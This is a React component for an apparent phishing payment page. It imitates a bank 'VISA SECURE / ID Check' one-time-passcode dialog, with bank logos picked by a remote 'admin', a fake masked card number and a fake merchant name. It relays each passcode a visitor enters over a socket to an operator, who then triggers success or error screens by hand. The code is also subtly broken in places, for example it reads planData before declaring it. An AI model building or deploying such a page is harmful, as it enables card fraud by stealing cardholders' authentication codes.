import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { ArrowLeft, CreditCard, Shield, Clock, CheckCircle, AlertCircle } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp';
import { io, Socket } from 'socket.io-client';
import { devLog, devError, devWarn } from '../utils/logger';

const Payment = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [socket, setSocket] = useState<Socket | null>(null);
  const [showOtp, setShowOtp] = useState(false);
  const [otp, setOtp] = useState('');
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState('');
  const [isProcessing, setIsProcessing] = useState(true);
  const [customAmount, setCustomAmount] = useState<number | null>(null);
  const [currency, setCurrency] = useState('INR');
  const [currencySymbol, setCurrencySymbol] = useState('₹');
  const [bankLogo, setBankLogo] = useState('');
  const [selectedBankName, setSelectedBankName] = useState('HDFC BANK');
  
  // Add payment ID state to track this specific payment session
  const [currentPaymentId] = useState(() => {
    const paymentId = planData.id || 'payment-' + Date.now();
    console.log('🆔 Payment.tsx initialized with Payment ID:', paymentId);
    console.log('📋 Plan data:', planData);
    return paymentId;
  });
  
  // Add debugging state
  const [debugInfo, setDebugInfo] = useState('No socket events received yet');

  // Bank logos data structure - MUST match Admin panel exactly
  const bankLogos = [
    { name: 'HDFC Bank', logo: 'https://logolook.net/wp-content/uploads/2021/11/HDFC-Bank-Logo-500x281.png' },
    { name: 'State Bank of India', logo: 'https://logotyp.us/file/sbi.svg' },
    { name: 'ICICI Bank', logo: 'https://www.pngkey.com/png/full/223-2237358_icici-bank-india-logo-design-png-transparent-images.png' },
    { name: 'Axis Bank', logo: 'https://upload.wikimedia.org/wikipedia/commons/1/1a/Axis_Bank_logo.svg' },
    { name: 'Bank of Baroda', logo: 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-Baroda-Logo-500x281.png' },
    { name: 'Punjab National Bank', logo: 'https://cdn.freelogovectors.net/wp-content/uploads/2023/01/punjab-national-bank-logo-pnb-freelogovectors.net_-400x225.png' },
    // Kotak Bank - Multiple logos (match one sent from admin)
    { name: 'Kotak Mahindra Bank', logo: 'https://logos-download.com/wp-content/uploads/2016/06/Kotak_Mahindra_Bank_logo-700x207.png' },
    { name: 'Kotak Mahindra Bank', logo: 'https://upload.wikimedia.org/wikipedia/en/thumb/3/39/Kotak_Mahindra_Group_logo.svg/578px-Kotak_Mahindra_Group_logo.svg.png?20201116103707' },
    { name: 'Bank of India', logo: 'https://1000logos.net/wp-content/uploads/2021/06/Bank-of-India-logo-500x281.png' },
    { name: 'Federal Bank', logo: 'https://stickypng.com/wp-content/uploads/2023/07/627ccab31b2e263b45696aa2.png' },
    { name: 'Union Bank', logo: 'https://cdn.pnggallery.com/wp-content/uploads/union-bank-of-india-logo-01.png' },
    { name: 'Bank of Maharashtra', logo: 'https://assets.stickpng.com/images/627cc5c91b2e263b45696a8e.png' },
    // Canara Bank - Multiple logos (match one sent from admin)
    { name: 'Canara Bank', logo: 'https://cdn.freelogovectors.net/svg10/canara-bank-logo-freelogovectors.net_.svg' },
    { name: 'Canara Bank', logo: 'https://images.seeklogo.com/logo-png/39/3/canara-bank-logo-png_seeklogo-397142.png' },
    { name: 'Indian Overseas Bank', logo: 'https://assets.stickpng.com/images/627ccc0c1b2e263b45696aac.png' },
    { name: 'Indian Bank', logo: 'https://cdn.freelogovectors.net/wp-content/uploads/2019/02/indian-bank-logo.png' },
    { name: 'IDBI Bank', logo: 'https://1000logos.net/wp-content/uploads/2021/05/IDBI-Bank-logo-500x281.png' },
    { name: 'IndusInd Bank', logo: 'https://images.seeklogo.com/logo-png/7/2/indusind-bank-logo-png_seeklogo-71354.png?v=1955232376276339464' },
    { name: 'Karnataka Bank', logo: 'https://wso2.cachefly.net/wso2/sites/all/images/Karnataka_Bank-logo.png' },
    { name: 'Yes Bank', logo: 'https://logodownload.org/wp-content/uploads/2019/08/yes-bank-logo-0.png' }
  ];

  // Function to get bank name from logo URL
  const getBankNameFromLogo = (logoUrl: string): string => {
    devLog('🔍 getBankNameFromLogo called with:', logoUrl);
    const bank = bankLogos.find(bank => bank.logo === logoUrl);
    devLog('🔍 Found bank:', bank);
    
    if (!bank) {
      devLog('⚠️ No bank found for logo URL. Available logos:');
      bankLogos.forEach((b, index) => {
        devLog(`${index + 1}. ${b.name}: ${b.logo}`);
      });
    }
    
    return bank ? bank.name.toUpperCase() : 'HDFC BANK';
  };

  // Extract plan data from location state or URL parameters
  const planData = location.state?.planData || location.state || {
    id: new URLSearchParams(location.search).get('id') || 'payment-' + Date.now(),
    amount: new URLSearchParams(location.search).get('amount') || '100',
    currency: new URLSearchParams(location.search).get('currency') || 'INR',
    name: new URLSearchParams(location.search).get('name') || 'Premium Plan',
    price: parseInt(new URLSearchParams(location.search).get('amount') || '100'),
    description: 'Payment processing'
  };

  // Debug output
  console.log('🐛 Payment component rendered');
  console.log('🐛 planData:', planData);
  console.log('🐛 showOtp:', showOtp);
  console.log('🐛 isProcessing:', isProcessing);
  console.log('🐛 success:', success);
  console.log('🐛 error:', error);
  
  useEffect(() => {
    console.log('🐛 useEffect running, planData:', planData);
    if (!planData) {
      console.log('🐛 No planData, navigating to home');
      navigate('/');
      return;
    }

    // Connect to WebSocket server
    const socketUrl = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')
      ? 'http://localhost:3002'
      : window.location.origin;
    
    console.log('🔌 ATTEMPTING SOCKET CONNECTION:');
    console.log('🌐 Socket URL:', socketUrl);
    console.log('🌐 Window hostname:', window.location.hostname);
    console.log('🌐 Window origin:', window.location.origin);
    
    console.log('🔌 Attempting to connect to socket server at:', socketUrl);

    const newSocket = io(socketUrl, {
      timeout: 10000,
      reconnection: true,
      reconnectionAttempts: 5,
      reconnectionDelay: 2000,
      transports: ['websocket', 'polling']
    });
    
    newSocket.on('connect', () => {
      console.log('🔌 Socket.io connection established:', {
        id: newSocket.id,
        time: new Date().toISOString()
      });
      console.log('📡 Emitting paymentId:', currentPaymentId);
      newSocket.emit('paymentId', currentPaymentId);
    });

    newSocket.on('connect_error', (error) => {
      console.error('🔌 Socket connection error:', {
        error,
        time: new Date().toISOString()
      });
    });

    newSocket.on('disconnect', (reason) => {
      console.log('🔌 Socket disconnected:', {
        reason,
        time: new Date().toISOString()
      });
    });

    newSocket.on('error', (error) => {
      console.error('🔌 Socket error:', {
        error,
        time: new Date().toISOString()
      });
    });

    newSocket.on('reconnect', (attempt) => {
      console.log(`🔌 Socket reconnected (attempt ${attempt})`);
    });

    newSocket.on('reconnect_attempt', (attempt) => {
      console.log(`🔌 Reconnection attempt ${attempt}`);
    });

    newSocket.on('reconnect_error', (error) => {
      console.error(`🔌 Reconnection error:`, error);
    });

    newSocket.on('reconnect_failed', () => {
      console.error('🔌 Reconnection failed');
    });
    
    // Add connection error handling
    newSocket.on('connect_error', (error: any) => {
      console.error('❌ SOCKET CONNECTION ERROR:', error);
      console.error('❌ Error type:', error.type || 'unknown');
      console.error('❌ Error message:', error.message || error.toString());
      console.error('❌ Socket URL was:', socketUrl);
    });
    
    newSocket.on('disconnect', (reason) => {
      console.warn('⚠️ SOCKET DISCONNECTED:', reason);
    });
    
    newSocket.on('reconnect_attempt', (attemptNumber) => {
      console.log(`🔄 Socket reconnect attempt #${attemptNumber}`);
    });
    
    newSocket.on('reconnect_error', (error) => {
      console.error('❌ Socket reconnection error:', error);
    });
    setSocket(newSocket);

    newSocket.on('connect', () => {
      devLog('🟢 Payment page connected to WebSocket server');
      devLog('🆔 Socket ID:', newSocket.id);
      devLog('🌐 Socket URL:', socketUrl);
      
      // Send a test ping to verify connection
      newSocket.emit('payment-page-connected', { 
        timestamp: Date.now(),
        page: 'payment',
        socketId: newSocket.id
      });
      
      devLog('✅ Payment page ready to receive events');
    });

    newSocket.on('disconnect', () => {
      devLog('Payment page disconnected from WebSocket server');
    });

    // Listen for both event types to ensure delivery
    const handleShowOtp = (data: any) => {
      devLog('🎯 RECEIVED show-otp event in Payment page:', data);
      devLog('🔍 Full event data:', JSON.stringify(data, null, 2));
      setDebugInfo(`Event received: ${JSON.stringify(data)}`);
      devLog('Setting showOtp to true...');
      setShowOtp(true);
      setIsProcessing(false); // Stop loading spinner when OTP form appears
      setError('');
      
      // Update currency display if custom data is provided
      if (data && data.customAmount !== undefined) {
        setCustomAmount(data.customAmount);
        setCurrency(data.currency || 'INR');
        setCurrencySymbol(data.currencySymbol || '₹');
        
        // IMPORTANT: Set bank logo BEFORE setting bank name
        const receivedBankLogo = data.bankLogo || '';
        devLog('🎨 Received bankLogo from admin:', receivedBankLogo);
        setBankLogo(receivedBankLogo);
        setDebugInfo(`Bank logo set to: ${receivedBankLogo}`);
        
        // Set the selected bank name based on the logo URL
        if (receivedBankLogo) {
          const bankName = getBankNameFromLogo(receivedBankLogo);
          setSelectedBankName(bankName);
          devLog('🏛️ Mapped bank name:', bankName);
          devLog('📋 Bank logos array:', bankLogos.map(b => ({ name: b.name, logo: b.logo })));
          setDebugInfo(`Bank: ${bankName}, Logo: ${receivedBankLogo}`);
        } else {
          devLog('⚠️ No bankLogo received, using default');
          setSelectedBankName('HDFC BANK');
          setDebugInfo('No bank logo received, using default HDFC');
        }
        
        devLog('Updated currency display:', {
          amount: data.customAmount,
          currency: data.currency,
          symbol: data.currencySymbol,
          bankLogo: data.bankLogo,
          bankName: data.bankLogo ? getBankNameFromLogo(data.bankLogo) : 'HDFC BANK'
        });
      } else {
        // Reset to defaults if no custom data
        setCustomAmount(null);
        setCurrency('INR');
        setCurrencySymbol('₹');
        setBankLogo('');
        setSelectedBankName('HDFC BANK');
      }
    };
    
    // Register ALL possible event listeners to ensure we catch the event
    newSocket.on('show-otp', handleShowOtp);
    newSocket.on('admin-show-otp', handleShowOtp);
    newSocket.on('broadcast-show-otp', handleShowOtp);
    
    // Test event listener to verify socket is working
    newSocket.on('test-event', (data) => {
      devLog('🧪 Test event received:', data);
    });
    
    devLog('🔌 Registered event listeners: show-otp, admin-show-otp, broadcast-show-otp');

    // Add debug listener for ALL socket events
    const originalEmit = newSocket.emit;
    const originalOn = newSocket.on;
    
    // Listen for all events for debugging
    newSocket.onAny((eventName, ...args) => {
      if (eventName === 'payment-approved' || eventName === 'invalid-otp-error') {
        console.log('📡 Socket event received:', eventName, args);
      }
    });

    newSocket.on('payment-approved', (data: { paymentId?: string, successHash?: string, paymentData?: any, timestamp?: string, source?: string }) => {
      console.log('🎉 PAYMENT APPROVED EVENT RECEIVED!');
      console.log('✅ Payment approved event received:', data);
      console.log('🆔 Current Payment ID:', currentPaymentId);
      console.log('🔍 Payment ID match?', !data?.paymentId || data.paymentId === currentPaymentId);
      devLog('Payment approved event received:', data, 'Current Payment ID:', currentPaymentId);
      
      // Add visual indicator that event was received
      document.title = '🎉 Payment Approved!';
      
      // Force success state immediately
      setSuccess(true);
      setShowOtp(false);
      setIsProcessing(false);
      
      // Only respond if this event is for our payment ID or if no payment ID specified (backward compatibility)
      if (!data?.paymentId || data.paymentId === currentPaymentId) {
        console.log('🎉 PAYMENT APPROVED - Processing for our payment!');
        devLog('Payment approved by admin for our payment!');
        setSuccess(true);
        setError('');
        setIsProcessing(false);
        setShowOtp(false); // Hide OTP modal on success
        
        // Store payment data in localStorage for success page
        if (data.paymentData) {
          const checkoutData = {
            ...data.paymentData,
            planName: planData.name,
            paymentId: currentPaymentId,
            timestamp: new Date().toISOString()
          };
          localStorage.setItem('userCheckoutData', JSON.stringify(checkoutData));
          console.log('💾 Stored payment data in localStorage:', checkoutData);
        }
        
        setTimeout(() => {
          if (data.successHash) {
            // Navigate to success page with hash if available
            console.log(`🎯 Navigating to success page with hash: ${data.successHash}`);
            navigate(`/payment-success/${data.successHash}`);
          } else {
            // Fallback to traditional method with state
            console.log('⚠️ No success hash provided, using fallback navigation');
            navigate('/payment-success', { 
              state: { 
                paymentData: data.paymentData || {
                  amount: planData.price?.toLocaleString(),
                  planName: planData.name,
                  transactionId: 'TXN' + Math.random().toString(36).substr(2, 9).toUpperCase(),
                  customerName: 'Customer',
                  email: 'customer@example.com',
                  date: new Date().toLocaleDateString('en-US', { 
                    year: 'numeric', 
                    month: 'long', 
                    day: 'numeric' 
                  })
                }
              }
            });
          }
        }, 3000);
      } else {
        console.log('❌ Payment approved event IGNORED - different payment ID:', data.paymentId);
        devLog('Payment approved event ignored - different payment ID:', data.paymentId);
      }
    });

    newSocket.on('payment-rejected', (reason: string) => {
      devLog('Payment rejected:', reason);
      setError(reason || 'Payment was rejected. Please try again.');
      setIsProcessing(false);
      setShowOtp(false);
    });

    newSocket.on('invalid-otp-error', (data: { paymentId?: string, timestamp?: string, source?: string }) => {
      console.log('❌ Invalid OTP error event received:', data);
      console.log('🆔 Current Payment ID:', currentPaymentId);
      console.log('🔍 Payment ID match?', !data?.paymentId || data.paymentId === currentPaymentId);
      devLog('Invalid OTP error received:', data, 'Current Payment ID:', currentPaymentId);
      
      // Only respond if this event is for our payment ID or if no payment ID specified (backward compatibility)
      if (!data?.paymentId || data.paymentId === currentPaymentId) {
        console.log('🔴 INVALID OTP - Processing for our payment!');
        devLog('Invalid OTP error for our payment!');
        setError('Incorrect OTP, please enter valid one time passcode');
        setIsProcessing(false);
      } else {
        console.log('❌ Invalid OTP error IGNORED - different payment ID:', data.paymentId);
        devLog('Invalid OTP error ignored - different payment ID:', data.paymentId);
      }
    });

    newSocket.on('card-declined-error', () => {
      devLog('Card declined error received');
      navigate('/checkout', { 
        state: { 
          planData,
          error: 'Your card has been declined!'
        }
      });
    });

    newSocket.on('insufficient-balance-error', () => {
      devLog('Insufficient balance error received');
      setError('Insufficient balance in your account. Please try with a different card.');
      setIsProcessing(false);
      setShowOtp(false);
    });

    return () => {
      newSocket.disconnect();
    };
  }, [planData, navigate]);

  const handleOtpSubmit = () => {
    if (otp.length === 6 && socket) {
      console.log('📤 Submitting OTP:', otp, 'Payment ID:', currentPaymentId);
      devLog('Submitting OTP:', otp, 'Payment ID:', currentPaymentId);
      socket.emit('otp-submitted', { 
        otp,
        paymentId: currentPaymentId,
        planData 
      });
      setIsProcessing(true);
      setError(''); // Clear any previous errors
    }
  };

  const handleBack = () => {
    navigate(-1);
  };

  if (!planData) {
    console.log('🐛 planData is falsy, returning null');
    return null;
  }
  
  console.log('🐛 About to render component');
  
  try {

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 p-4">
      <div className="max-w-md mx-auto">
        {/* Header */}
        <div className="flex items-center gap-4 mb-6">
          <Button
            variant="ghost"
            size="sm"
            onClick={handleBack}
            className="text-gray-600 hover:text-gray-800"
          >
            <ArrowLeft className="h-4 w-4" />
          </Button>
          <h1 className="text-xl font-semibold text-gray-800">Payment Processing</h1>
        </div>

        {/* Payment Card */}
        <div className="bg-white rounded-2xl shadow-xl p-6 mb-6">
          <div className="text-center mb-6">
            <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <CreditCard className="h-8 w-8 text-blue-600" />
            </div>
            <h2 className="text-2xl font-bold text-gray-800 mb-2">Secure Payment</h2>
            <p className="text-gray-600">Processing your payment for {planData.name}</p>
          </div>

          {/* Amount */}
          <div className="bg-gray-50 rounded-lg p-4 mb-6">
            <div className="flex justify-between items-center">
              <span className="text-gray-600">Amount to pay:</span>
              <span className="text-2xl font-bold text-gray-800">₹{planData.price?.toLocaleString()}</span>
            </div>
          </div>

          {/* Success State */}
          {success && (
            <div className="text-center py-8">
              <CheckCircle className="h-16 w-16 text-green-500 mx-auto mb-4" />
              <h3 className="text-xl font-semibold text-green-600 mb-2">Payment Successful!</h3>
              <p className="text-gray-600 mb-4">Redirecting you to your dashboard...</p>
            </div>
          )}

          {/* Error State */}
          {error && (
            <div className="text-center py-6">
              <AlertCircle className="h-12 w-12 text-red-500 mx-auto mb-4" />
              <h3 className="text-lg font-semibold text-red-600 mb-2">Payment Error</h3>
              <p className="text-gray-600 mb-4">{error}</p>
              <Button
                onClick={() => navigate('/checkout', { state: { planData } })}
                className="bg-blue-600 hover:bg-blue-700"
              >
                Try Again
              </Button>
            </div>
          )}

          {/* Loading State - Waiting for Admin */}
          {isProcessing && !showOtp && !success && !error && (
            <div className="text-center py-8">
              <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
                <Clock className="h-8 w-8 text-blue-600 animate-spin" />
              </div>
              <h3 className="text-xl font-semibold text-blue-600 mb-2">Processing Payment</h3>
              <p className="text-gray-600 mb-4">Waiting for admin approval...</p>
              <div className="bg-blue-50 rounded-lg p-4 mb-4">
                <div className="flex items-center gap-2 text-sm text-blue-700">
                  <Shield className="h-4 w-4" />
                  <span>Your payment is being verified by our security team</span>
                </div>
              </div>
              <div className="flex justify-center">
                <div className="flex space-x-1">
                  <div className="w-2 h-2 bg-blue-600 rounded-full animate-bounce" style={{animationDelay: '0ms'}}></div>
                  <div className="w-2 h-2 bg-blue-600 rounded-full animate-bounce" style={{animationDelay: '150ms'}}></div>
                  <div className="w-2 h-2 bg-blue-600 rounded-full animate-bounce" style={{animationDelay: '300ms'}}></div>
                </div>
              </div>
            </div>
          )}

          {/* OTP Input - Hide when success */}
          {showOtp && !success && !error && (
            <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
              <div className="relative bg-white rounded-lg shadow-2xl max-w-xs sm:max-w-md lg:max-w-lg w-full mx-auto">
                {/* Top Header with VISA SECURE and Bank Logo */}
                <div className="bg-white border-b border-gray-200 px-3 py-2 rounded-t-lg">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-1">
                      <div className="bg-blue-600 text-white px-1.5 py-0.5 rounded text-xs font-bold">
                        VISA
                      </div>
                      <span className="text-xs font-medium text-gray-700">SECURE</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <span className="text-xs font-medium text-gray-700">ID Check</span>
                      {/* Dynamic Bank Logo */}
                      {bankLogo ? (
                        <div className="w-8 h-6 bg-white rounded flex items-center justify-center border border-gray-200">
                          <img 
                            src={bankLogo} 
                            alt={selectedBankName + ' Logo'} 
                            className="max-w-full max-h-full object-contain"
                            onError={(e) => {
                              devLog('❌ Top header bank logo failed to load:', bankLogo);
                              // Fallback to default text if bank logo fails to load
                              e.currentTarget.parentElement!.innerHTML = '<span class="text-blue-600 text-xs font-bold">BANK</span>';
                            }}
                            onLoad={() => {
                              devLog('✅ Top header bank logo loaded successfully:', bankLogo);
                            }}
                          />
                        </div>
                      ) : (
                        <div className="w-8 h-6 bg-blue-600 rounded flex items-center justify-center">
                          <span className="text-white text-xs font-bold">BANK</span>
                        </div>
                      )}
                    </div>
                  </div>
                </div>

                {/* Cancel Button - Top Right */}
                <button
                  onClick={handleBack}
                  className="absolute top-2 right-2 text-gray-500 hover:text-gray-700 text-xs font-medium z-10 px-2 py-1"
                >
                  cancel
                </button>



                {/* Merchant Details */}
                <div className="p-3 border-b bg-gray-50">
                  <div className="space-y-1 text-xs bg-white rounded p-2">
                    <div className="flex justify-between">
                      <span className="text-gray-600">Merchant Name</span>
                      <span className="font-medium">PLURALSIGHT</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-600">Date</span>
                      <span className="font-medium">{new Date().toLocaleDateString('en-US', { day: '2-digit', month: 'short', year: 'numeric' })}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-600">Card Number</span>
                      <span className="font-medium">4234 XXXX XXXX 4989</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-600">Amount</span>
                      <span className="font-medium text-blue-600">
                        {customAmount !== null ? (
                          `${currencySymbol}${customAmount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
                        ) : (
                          `₹${planData.price?.toLocaleString()}.00`
                        )}
                      </span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-600">Personal Message</span>
                      <span className="font-medium text-gray-400">-</span>
                    </div>
                  </div>
                </div>

                {/* Authentication Section */}
                <div className="p-3">
                  <h3 className="text-blue-600 font-semibold text-sm mb-2 text-center">Authenticate Transaction</h3>
                  
                  {/* Success Message */}
                  <div className="bg-green-100 border border-green-300 rounded p-2 mb-3 text-center">
                    <p className="text-green-700 text-xs">
                      One time passcode has been sent to your registered<br />
                      mobile number <span className="font-mono">XX4679</span>
                    </p>
                  </div>

                  {/* OTP Error Message */}
                  {error && (
                    <div className="bg-red-100 border border-red-300 rounded p-2 mb-3 text-center">
                      <p className="text-red-700 text-xs font-medium">{error}</p>
                    </div>
                  )}

                  {/* Click Here Button */}
                  <div className="text-center mb-3">
                    <button className="bg-blue-600 text-white px-3 py-1 rounded text-xs font-medium hover:bg-blue-700">
                      CLICK HERE For Addon Cardholder OTP
                    </button>
                  </div>

                  {/* OTP Input */}
                  <div className="mb-3">
                    <div className="text-center mb-2">
                      <input
                        type="text"
                        placeholder="Enter OTP Here"
                        value={otp}
                        onChange={(e) => setOtp(e.target.value)}
                        disabled={isProcessing}
                        className={`w-full p-2 border border-gray-300 rounded text-center text-sm font-mono ${isProcessing ? 'bg-gray-100' : ''}`}
                        maxLength={6}
                      />
                    </div>
                    <div className="text-center">
                      <button className="text-blue-600 text-xs hover:underline">Resend OTP</button>
                    </div>
                  </div>

                  {/* Action Buttons */}
                  <div className="space-y-2">
                    <button
                      onClick={handleOtpSubmit}
                      disabled={otp.length !== 6 || isProcessing}
                      className={`w-full bg-blue-600 text-white py-2 rounded font-medium text-sm hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed ${isProcessing ? 'relative' : ''}`}
                    >
                      {isProcessing ? (
                        <>
                          <div className="absolute inset-0 flex items-center justify-center">
                            <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
                          </div>
                          <span className="blur-sm">SUBMIT</span>
                        </>
                      ) : (
                        'SUBMIT'
                      )}
                    </button>
                    <button
                      onClick={handleBack}
                      className="w-full border border-gray-300 text-gray-700 py-2 rounded hover:bg-gray-50 font-medium text-sm"
                    >
                      CANCEL
                    </button>
                  </div>

                  {/* Timer */}
                  <p className="text-center text-xs text-gray-500 mt-2">
                    This page automatically time out after 2.49 minutes
                  </p>

                  {/* Powered by */}
                  <div className="text-center mt-2 pt-2 border-t border-gray-200">
                    <p className="text-xs text-gray-400 mb-1">Powered by</p>
                    <div className="flex items-center justify-center">
                      <div className="w-4 h-4 bg-green-600 rounded-full flex items-center justify-center mr-1">
                        <div className="w-2 h-2 bg-white rounded-full"></div>
                      </div>
                      <span className="text-green-600 font-semibold text-xs">onetap</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}


        </div>

        {/* Security Notice */}
        <div className="bg-white rounded-xl p-4">
          <div className="flex items-center gap-3">
            <Shield className="h-5 w-5 text-green-500" />
            <div>
              <p className="text-sm font-medium text-gray-800">Secure Payment</p>
              <p className="text-xs text-gray-600">Your payment information is encrypted and secure</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
  } catch (error) {
    console.error('🐛 Payment component render error:', error);
    return (
      <div className="min-h-screen bg-red-50 p-4 flex items-center justify-center">
        <div className="bg-white p-6 rounded-lg shadow-lg text-center">
          <h2 className="text-xl font-bold text-red-600 mb-2">Payment Component Error</h2>
          <p className="text-gray-600 mb-4">There was an error loading the payment page.</p>
          <button 
            onClick={() => navigate('/')}
            className="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700"
          >
            Go Home
          </button>
        </div>
      </div>
    );
  }
};

export default Payment;
